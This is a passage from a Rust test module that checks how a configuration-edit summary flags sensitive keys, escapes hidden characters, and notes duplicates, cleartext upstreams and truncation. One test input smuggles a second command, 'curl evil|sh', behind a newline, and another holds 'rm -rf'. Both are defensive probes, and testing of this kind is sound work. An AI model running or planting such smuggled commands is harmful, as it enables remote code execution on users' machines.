            &["providers", "x", "models"],
            &["repo", "timeout_secs"],
            &["memory", "promote_at"],
            &["supervision", "timeout_secs"],
            &["supervision", "dependency_inputs", "x"],
        ] {
            assert!(!sensitive(key), "{key:?}");
        }
    }

    /// The probes: what a prompt could not show is shown as an escape, never
    /// dropped, in a value and in a key.
    #[test]
    fn hidden_characters_are_shown_as_escapes() {
        assert_eq!(
            quote("composer install #\ncurl evil|sh"),
            "\"composer install #\\ncurl evil|sh\""
        );
        assert_eq!(quote("rm -rf ./build\t~"), "\"rm -rf ./build\\t~\"");
        assert_eq!(quote("a\r\nb"), "\"a\\r\\nb\"");
        assert_eq!(quote("same\u{200b}"), "\"same\\u{200b}\"");
        let line = prompt(
            "",
            &[set(
                "providers.\"open\u{200b}ai\".upstream",
                "https://h.example/v1",
            )],
        )
        .unwrap();
        assert!(
            line.contains("providers.\"open\\u{200b}ai\".upstream"),
            "{line}"
        );
    }

    #[test]
    fn a_duplicate_added_to_a_list_is_shown() {
        let line = prompt(
            "[gateway]\nallow_hosts = [\"a\"]\n",
            &[set("gateway.allow_hosts", strings(&["a", "a"]))],
        )
        .unwrap();
        assert_eq!(line, "Change node.toml: gateway.allow_hosts: + \"a\"");
    }

    #[test]
    fn a_cleartext_upstream_says_so() {
        let line = prompt(
            "",
            &[set("providers.x.upstream", "http://h.example:8080/v1")],
        )
        .unwrap();
        assert!(
            line.contains("= \"http://h.example:8080/v1\" (cleartext)"),
            "{line}"
        );
    }

    /// Naming a built-in provider in the file for the first time replaces it
    /// whole, so even a routine key there says so, as sensitive.
    #[test]
    fn writing_under_a_built_in_provider_says_it_replaces_it() {
        let line = prompt(
            "",
            &[set("providers.openai.models", toml::Value::Array(vec![]))],
        )
        .unwrap();
        assert!(
            line.starts_with(
                "Change node.toml: creates providers.openai (replaces the built-in provider)"
            ),
            "{line}"
        );
    }

    /// The count of what is not shown always fits: the sensitive part leaves
    /// room for it, or the edit is refused.
    #[test]
    fn the_count_of_what_is_not_shown_is_never_cut() {
        let fill = format!("/opt/{}/gh", "x".repeat(560));
        let mut ops = vec![set("publish.gh", fill.as_str())];
        for i in 0..5 {
            ops.push(set(
                &format!("providers.\"p{i}\".models"),
                toml::Value::Array(vec![]),
            ));
        }
        match prompt("", &ops) {
            Ok(line) => {
                assert!(line.chars().count() <= MAX_SUMMARY, "{line}");
                assert!(line.ends_with("more"), "{line}");
            }
            Err(err) => assert!(err.contains("split"), "{err}"),
        }
    }
}
